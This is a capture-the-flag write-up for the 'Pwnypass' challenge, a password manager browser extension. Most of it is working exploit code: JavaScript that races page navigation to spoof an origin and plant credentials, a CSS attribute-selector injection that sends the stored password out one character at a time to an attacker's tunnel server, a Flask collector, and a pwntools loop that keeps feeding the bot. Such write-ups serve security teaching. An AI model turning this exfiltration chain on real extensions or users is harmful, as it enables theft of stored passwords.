# Pwnypass

We're working on a cool password manager extension for SIGPwny members. Can you break it?

```bash
ncat --ssl pwnypass-bot.chal.uiuc.tf 1337
```

## Setup

I have created this **docker-compose.yml** file:

```yml
services:
  challenge:
    build: .
    ports:
      - 1337:1337
      - 1338:1338
    privileged: true
```

Also modify the **bot.js** file in order to reduce the bot **timeout** for debugging:

```js
const BOT_TIMEOUT = process.env.BOT_TIMEOUT || 10000;
```

## Writeup Flag 1

We need to steel **sigpwny** password from the password manager extensions with **https://pwnypass.c.hc.lc** as **origin**.

To do it, we can use this sequence of **js** command in order to change our **origin** and submit a new password for **https://pwnypass.c.hc.lc**:

```html
<form id=f><input type=text id=u value='new-username'><input type=password id=p value='new-password'></form>
<script>
const delay = t => new Promise(r => setTimeout(r, t));
onload = async () => {
    await delay(1000);
    window.location.assign("https://pwnypass.c.hc.lc/");
    p.dispatchEvent(new Event('change'));
    await delay(25);
    window.stop();
    await delay(300);
    window.location.assign("https://pwnypass.c.hc.lc/");
    f.dispatchEvent(new Event('submit'));
    await delay(25);
    window.stop();
    await delay(200);
    window.location.assign("https://pwnypass.c.hc.lc/login.php");
};
</script>
```

The new credentials that we want to write are an **CSS Injection** attack that it will steel original password:

```css
[data-username="sigpwny"]~[data-password^="uiuctf{f"]{{background:url("https://fb703645550ca9.lhr.life/guess/102");}}
```

We can repeat this payload with all **ascii** chars and if one of this chars **match** it will send a request to our **server**.

So we can make this exploit and use **localhost.run** to have a public address:

```bash
ssh -R 80:localhost:8000 nokey@localhost.run
```

Now launch the exploit with the correct public ip:

```python
from flask import Flask

app = Flask(__name__)

PAYLOAD = """
<form id=f><input type=text id=u value='hack'><input type=password id=p value='<style>{0}</style>'></form>
<script>
const delay = t => new Promise(r => setTimeout(r, t));
onload = async () => {{
    await delay(1000);
    window.location.assign("https://pwnypass.c.hc.lc/");
    p.dispatchEvent(new Event('change'));
    await delay(25);
    window.stop();
    await delay(300);
    window.location.assign("https://pwnypass.c.hc.lc/");
    f.dispatchEvent(new Event('submit'));
    await delay(25);
    window.stop();
    await delay(200);
    window.location.assign("https://pwnypass.c.hc.lc/login.php");
}};
</script>
"""

ALPHA = r"abcdefghijklmnopqrstuvwxyz{}_?!@#$%^&*(0123456789"
ORIGIN = "https://84110b9b01de67.lhr.life"
guessed_flag = "uiuctf{"

def generate_style():
    style = ""
    for c in ALPHA:
        style += f'[data-username="sigpwny"]~[data-password^="{guessed_flag}{c}"]{{background:url({ORIGIN}/guess/{ord(c)});}}'
    return style

@app.route("/")
def brute():
    #print('Payload sent:', str.format(PAYLOAD, generate_style()))
    return str.format(PAYLOAD, generate_style())

@app.route('/guess/<int:char>')
def guess(char):
    global guessed_flag
    guessed_flag += chr(char)
    print('Current flag:', guessed_flag)
    return 'this is not a valid image =)'

if __name__ == '__main__':
    app.run('0.0.0.0', debug=False, port=8000)
```

Now, to steel the complete password, we need to repeat this attack and clear the directory where the extension will store all credentials.

Otherwise we will receive always the same char.

So we can build this script to submit the attacker link (just wait the **timeout** string of the **bot**):

```python
from pwn import *

ip = 'localhost'
ip = 'pwnypass-bot.chal.uiuc.tf'
port = 1337

attacker_url = b'https://84110b9b01de67.lhr.life'

while True:
    conn = remote(ip, port, ssl=True)
    conn.recv()

    conn.sendline(attacker_url)
    conn.recvuntil(b'timeout')
    print("Attack done!")
    conn.close()
```

Now launch all scripts and wait until entire flag is stolen:

```
uiuctf{0h_no_th3_pwn1es_4r3
```